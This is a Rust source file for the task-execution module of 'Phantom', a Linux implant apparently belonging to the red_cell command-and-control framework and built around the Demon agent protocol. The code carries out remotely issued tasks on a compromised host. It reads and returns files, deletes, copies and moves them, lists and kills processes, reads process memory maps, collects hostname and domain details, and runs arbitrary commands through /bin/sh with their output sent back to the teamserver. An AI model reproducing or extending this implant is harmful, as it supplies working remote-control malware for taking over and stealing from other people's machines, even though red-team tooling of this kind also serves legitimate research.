//! Linux task execution for the Phantom agent.

use std::ffi::OsString;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonProcessCommand,
};
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

/// Result of executing a single task package.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandResult {
    /// Emit a generic output callback with the supplied text.
    Output(String),
    /// Emit a generic error callback with the supplied text.
    Error(String),
    /// Emit an exit callback and stop the agent loop.
    Exit(u32),
    /// Nothing to return to the teamserver.
    Empty,
}

/// Execute a single Demon task package.
pub async fn execute(
    package: &red_cell_common::demon::DemonPackage,
) -> Result<CommandResult, PhantomError> {
    match package.command()? {
        DemonCommand::CommandNoJob => Ok(CommandResult::Empty),
        DemonCommand::CommandSleep => {
            let mut parser = TaskParser::new(&package.payload);
            let sleep_ms = parser.int32()?;
            Ok(CommandResult::Output(format!("sleep updated to {sleep_ms} ms")))
        }
        DemonCommand::CommandFs => execute_filesystem(&package.payload),
        DemonCommand::CommandProcList => execute_process_list(&package.payload),
        DemonCommand::CommandProc => execute_process(&package.payload).await,
        DemonCommand::CommandNet => execute_network(&package.payload),
        DemonCommand::CommandExit => {
            let mut parser = TaskParser::new(&package.payload);
            let exit_method = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
            Ok(CommandResult::Exit(exit_method))
        }
        command => {
            Ok(CommandResult::Error(format!("phantom does not implement command {command:?} yet")))
        }
    }
}

fn execute_filesystem(payload: &[u8]) -> Result<CommandResult, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand)?;

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let _file_explorer = parser.bool32()?;
            let target = normalize_path(&parser.wstring()?);
            let _subdirs = parser.bool32()?;
            let files_only = parser.bool32()?;
            let dirs_only = parser.bool32()?;
            let _list_only = parser.bool32()?;
            let _starts = parser.wstring()?;
            let _contains = parser.wstring()?;
            let _ends = parser.wstring()?;

            let entries = fs::read_dir(&target).map_err(|error| io_error(&target, error))?;
            let mut output = Vec::new();
            for entry in entries {
                let entry = entry.map_err(|error| io_error(&target, error))?;
                let metadata = entry.metadata().map_err(|error| io_error(entry.path(), error))?;
                if files_only && metadata.is_dir() {
                    continue;
                }
                if dirs_only && metadata.is_file() {
                    continue;
                }
                let kind = if metadata.is_dir() { "dir" } else { "file" };
                output.push(format!("{kind}\t{}", entry.path().display()));
            }
            Ok(CommandResult::Output(output.join("\n")))
        }
        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
            let path = normalize_path(&parser.wstring()?);
            let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
            Ok(CommandResult::Output(String::from_utf8_lossy(&contents).into_owned()))
        }
        DemonFilesystemCommand::Upload => {
            let path = normalize_path(&parser.wstring()?);
            let _mem_file_id = parser.int32()?;
            Ok(CommandResult::Error(format!(
                "upload to {} requires memfile integration that Phantom does not implement yet",
                path.display()
            )))
        }
        DemonFilesystemCommand::Cd => {
            let path = normalize_path(&parser.wstring()?);
            std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
            Ok(CommandResult::Output(path.display().to_string()))
        }
        DemonFilesystemCommand::Remove => {
            let path = normalize_path(&parser.wstring()?);
            if path.is_dir() {
                fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
            } else {
                fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
            }
            Ok(CommandResult::Output(path.display().to_string()))
        }
        DemonFilesystemCommand::Mkdir => {
            let path = normalize_path(&parser.wstring()?);
            fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
            Ok(CommandResult::Output(path.display().to_string()))
        }
        DemonFilesystemCommand::Copy => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
            Ok(CommandResult::Output(format!("{} -> {}", from.display(), to.display())))
        }
        DemonFilesystemCommand::Move => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
            Ok(CommandResult::Output(format!("{} -> {}", from.display(), to.display())))
        }
        DemonFilesystemCommand::GetPwd => {
            let path = std::env::current_dir()
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            Ok(CommandResult::Output(path.display().to_string()))
        }
    }
}

fn execute_process_list(payload: &[u8]) -> Result<CommandResult, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _process_ui = parser.int32()?;

    let mut lines = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        let exe = fs::read_link(entry.path().join("exe")).unwrap_or_else(|_| PathBuf::from("?"));
        lines.push(format!("{pid}\t{}", executable_name(&exe)));
    }

    lines.sort();
    Ok(CommandResult::Output(lines.join("\n")))
}

async fn execute_process(payload: &[u8]) -> Result<CommandResult, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let _verbose = parser.bool32()?;

            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };

            let mut command = Command::new(&binary);
            if process_args.is_empty() {
                if binary == "/bin/sh" {
                    command.arg("-c").arg("true");
                }
            } else if binary == "/bin/sh" {
                command.arg("-c").arg(process_args);
            } else {
                command.args(split_args(&process_args));
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let output = command
                    .output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                Ok(CommandResult::Output(merged))
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                Ok(CommandResult::Output(format!(
                    "spawned {} with pid {}",
                    binary,
                    child.id().unwrap_or_default()
                )))
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            Ok(CommandResult::Output(format!("terminated pid {pid}")))
        }
        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let listing = execute_process_list(&0_i32.to_le_bytes())?;
            match listing {
                CommandResult::Output(lines) => {
                    let filtered = lines
                        .lines()
                        .filter(|line| line.to_lowercase().contains(&needle))
                        .collect::<Vec<_>>()
                        .join("\n");
                    Ok(CommandResult::Output(filtered))
                }
                _ => Ok(CommandResult::Empty),
            }
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32().unwrap_or_default()).unwrap_or_default();
            let maps =
                if pid == 0 { "/proc/self/maps".to_string() } else { format!("/proc/{pid}/maps") };
            let contents = fs::read_to_string(&maps).map_err(|error| io_error(&maps, error))?;
            Ok(CommandResult::Output(contents))
        }
        DemonProcessCommand::Memory => {
            let pid = parser.int32()?;
            let _query_protection = parser.int32()?;
            Ok(CommandResult::Error(format!(
                "process memory enumeration for pid {pid} is not implemented in Phantom yet"
            )))
        }
    }
}

fn execute_network(payload: &[u8]) -> Result<CommandResult, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
    let subcommand = DemonNetCommand::try_from(subcommand)?;

    match subcommand {
        DemonNetCommand::Domain => {
            let domain = fs::read_to_string("/etc/resolv.conf")
                .ok()
                .and_then(|contents| {
                    contents.lines().find_map(|line| {
                        let trimmed = line.trim();
                        trimmed
                            .strip_prefix("search ")
                            .or_else(|| trimmed.strip_prefix("domain "))
                            .map(|value| value.trim().to_string())
                    })
                })
                .unwrap_or_else(|| String::from("WORKGROUP"));
            Ok(CommandResult::Output(domain))
        }
        DemonNetCommand::Computer => {
            let hostname =
                fs::read_to_string("/etc/hostname").unwrap_or_else(|_| String::from("unknown"));
            Ok(CommandResult::Output(hostname.trim().to_string()))
        }
        DemonNetCommand::Logons
        | DemonNetCommand::Sessions
        | DemonNetCommand::DcList
        | DemonNetCommand::Share
        | DemonNetCommand::LocalGroup
        | DemonNetCommand::Group
        | DemonNetCommand::Users => Ok(CommandResult::Error(format!(
            "network subcommand {subcommand:?} is not implemented in Phantom yet"
        ))),
    }
}

fn normalize_path(value: &str) -> PathBuf {
    if value.is_empty() || value == "." {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(value)
    }
}

fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
    PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
}

fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}

#[cfg(test)]
mod tests {
    use red_cell_common::demon::{
        DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand,
    };

    use super::{CommandResult, execute};

    fn utf16_payload(value: &str) -> Vec<u8> {
        let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
        let mut payload = Vec::with_capacity(4 + utf16.len());
        payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
        payload.extend_from_slice(&utf16);
        payload
    }

    #[tokio::test]
    async fn command_no_job_returns_empty() {
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let result = execute(&package).await.expect("execute");
        assert_eq!(result, CommandResult::Empty);
    }

    #[tokio::test]
    async fn get_pwd_returns_current_directory() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);

        let result = execute(&package).await.expect("execute");
        assert!(matches!(result, CommandResult::Output(_)));
    }

    #[tokio::test]
    async fn proc_create_with_pipe_returns_command_output() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&utf16_payload("/bin/sh"));
        payload.extend_from_slice(&utf16_payload("printf phantom-test"));
        payload.extend_from_slice(&1_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);

        let result = execute(&package).await.expect("execute");
        assert_eq!(result, CommandResult::Output(String::from("phantom-test")));
    }
}
